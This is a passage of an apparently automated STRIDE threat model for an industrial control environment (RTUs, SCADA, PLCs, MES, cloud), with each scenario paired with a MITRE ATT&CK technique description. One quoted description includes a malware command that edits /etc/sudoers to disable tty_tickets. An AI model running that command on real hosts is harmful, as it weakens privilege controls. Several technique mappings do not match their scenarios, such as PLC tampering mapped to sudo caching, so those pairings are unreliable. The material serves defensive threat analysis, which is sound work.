            ],
            "Potential Impact": "Compromise of data integrity and disruption of system operations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "remote terminal unit",
                "control center"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker accesses cloud services by impersonating a legitimate field device.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no device authentication for cloud service access",
                    "Role": "Cloud Architect",
                    "Condition": "Authenticated devices are not sufficiently verified."
                },
                {
                    "Assumption": "Field devices are accessible from the internet without additional security layers",
                    "Role": "Security Engineer",
                    "Condition": "Field devices are exposed directly to the internet."
                }
            ],
            "Potential Impact": "Unauthorized access to cloud-hosted data leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "device",
                "cloud",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends misleading SCADA commands by spoofing the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient verification of source of gateway commands",
                    "Role": "System Administrator",
                    "Condition": "Commands are executed without proper verification of origin."
                },
                {
                    "Assumption": "Network traffic between SCADA and gateway is not encrypted",
                    "Role": "Network Security Specialist",
                    "Condition": "Sensitive data is transmitted in plaintext."
                }
            ],
            "Potential Impact": "Data integrity compromise and potential physical damage to manufacturing systems.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "scada",
                "gateway",
                "command"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data in transit between RTUs and the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Encryption is not used for data transmission",
                    "Role": "Security Engineer",
                    "Condition": "Data is transmitted without encryption."
                },
                {
                    "Assumption": "Network traffic can be intercepted and altered",
                    "Role": "Network Engineer",
                    "Condition": "Communication channels are unprotected."
                }
            ],
            "Potential Impact": "Corruption of operational data, leading to incorrect decision-making and operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data transmission",
                "control center"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates database records in the MES system.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are weak or poorly implemented",
                    "Role": "Database Administrator",
                    "Condition": "Weak or insufficient access control measures."
                },
                {
                    "Assumption": "Insufficient logging and monitoring of database activities",
                    "Role": "IT Security Specialist",
                    "Condition": "Inadequate monitoring of database operations."
                }
            ],
            "Potential Impact": "Corrupted workflow management and compromised production processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "manufacturing execution system",
                "mes"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies configuration settings on a PLC.",
            "Assumptions": [
                {
                    "Assumption": "PLCs allow remote configuration without strong authentication",
                    "Role": "PLC Programmer",
                    "Condition": "Weak or open access to PLCs."
                },
                {
                    "Assumption": "Network lacks segmentation to isolate PLC traffic",
                    "Role": "Network Engineer",
                    "Condition": "Unsegmented network allowing broader access."
                }
            ],
            "Potential Impact": "Disruption of industrial processes and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "plc",
                "configuration",
                "remote access"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider denies sending a critical control command that led to a system malfunction.",
            "Assumptions": [
                {
                    "Assumption": "Lack of non-repudiation mechanisms for critical commands",
                    "Role": "Security Architect",
                    "Condition": "No mechanisms to ensure command integrity."
                },
                {
                    "Assumption": "Inadequate logging of user activities and command issuance",
                    "Role": "IT Administrator",
                    "Condition": "Logs are insufficient or not detailed."
                }
            ],
            "Potential Impact": "Difficulty in tracing actions and assigning accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "control command",
                "insider",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making unauthorized changes to MES workflow data.",
            "Assumptions": [
                {
                    "Assumption": "Weak logging of database and user activity",
                    "Role": "Database Administrator",
                    "Condition": "Activity logs are inadequate or not monitored."
                },
                {
                    "Assumption": "Insufficient access control policies",
                    "Role": "IT Security Specialist",
                    "Condition": "Inadequate policies controlling data access."
                }
            ],
            "Potential Impact": "Difficulties in auditing and accountability, potentially leading to recurring issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "workflow",
                "database",
                "mes"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A remote attacker denies initiating a DDoS attack on the gateway.",
            "Assumptions": [
                {
                    "Assumption": "No effective logging or monitoring of network traffic",
                    "Role": "Network Engineer",
                    "Condition": "Logs do not capture detailed network activity."
                },
                {
                    "Assumption": "Gateway lacks sufficient incident response capability",
                    "Role": "Incident Response Team",
                    "Condition": "Inadequate tools for forensic analysis."
                }
            ],
            "Potential Impact": "Inability to trace attacks back to their origin and prevent recurrence.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "gateway",
                "ddos",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is intercepted while being transmitted from the RTUs to the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted in plaintext without encryption",
                    "Role": "Network Security Specialist",
                    "Condition": "Unencrypted communication."
                },
                {
                    "Assumption": "Network lacks sufficient protection against eavesdropping",
                    "Role": "Network Engineer",
                    "Condition": "Weak network defenses."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data transmission",
                "network",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud-stored data through exploiting a vulnerability in the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service has unpatched vulnerabilities",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched vulnerabilities exist."
                },
                {
                    "Assumption": "No additional protection mechanisms for stored data",
                    "Role": "Security Engineer",
                    "Condition": "Lack of advanced data protection measures."
                }
            ],
            "Potential Impact": "Breaches of sensitive data stored in the cloud, leading to data leaks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "vulnerability",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses sensitive configuration files on the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Gateway filesystem is not adequately secured",
                    "Role": "System Administrator",
                    "Condition": "Weak file system security."
                },
                {
                    "Assumption": "No encryption for sensitive configuration files",
                    "Role": "Security Engineer",
                    "Condition": "Sensitive files are not encrypted."
                }
            ],
            "Potential Impact": "Exposure of sensitive configuration data, potentially leading to further attacks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "gateway",
                "configuration file",
                "file system"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack targets the Control Center, overwhelming its capability to issue commands.",
            "Assumptions": [
                {
                    "Assumption": "Control Center lacks DDoS protection mechanisms",
                    "Role": "Security Architect",
                    "Condition": "Absence of DDoS mitigation tools."
                },
                {
                    "Assumption": "Network capacity cannot withstand high-volume attacks",
                    "Role": "Network Engineer",
                    "Condition": "Network bandwidth is insufficient."
                }
            ],
            "Potential Impact": "Disruption of command issuance and overall operational control.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "control center",
                "ddos",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods RTUs with junk data, preventing them from processing legitimate commands.",
            "Assumptions": [
                {
                    "Assumption": "RTUs have limited capacity for handling data",
                    "Role": "System Engineer",
                    "Condition": "RTU processing power is limited."
                },
                {
                    "Assumption": "No rate-limiting on data received by RTUs",
                    "Role": "Security Engineer",
                    "Condition": "No rate-limiting mechanisms in place."
                }
            ],
            "Potential Impact": "Blocking of legitimate command processing, leading to operational downtime.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "remote terminal unit",
                "rtu",
                "data flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Interruption of communications between field devices and the SCADA system by overwhelming the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Gateway has no protection against traffic spikes",
                    "Role": "Network Engineer",
                    "Condition": "Gateway lacks traffic management."
                },
                {
                    "Assumption": "Field devices and SCADA system require continuous communication",
                    "Role": "Industrial Engineer",
                    "Condition": "Continuous data flow is needed."
                }
            ],
            "Potential Impact": "Breakdown in communication resulting in loss of real-time data and control.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "gateway",
                "scada",
                "field devices"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES to gain admin access.",
            "Assumptions": [
                {
                    "Assumption": "MES has unpatched vulnerabilities",
                    "Role": "IT Security Specialist",
                    "Condition": "Known vulnerabilities are not patched."
                },
                {
                    "Assumption": "No multi-factor authentication for administrative accounts",
                    "Role": "IT Administrator",
                    "Condition": "Weak authentication protocols."
                }
            ],
            "Potential Impact": "Complete control over MES, leading to manipulated production workflows and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "mes",
                "administrative access",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 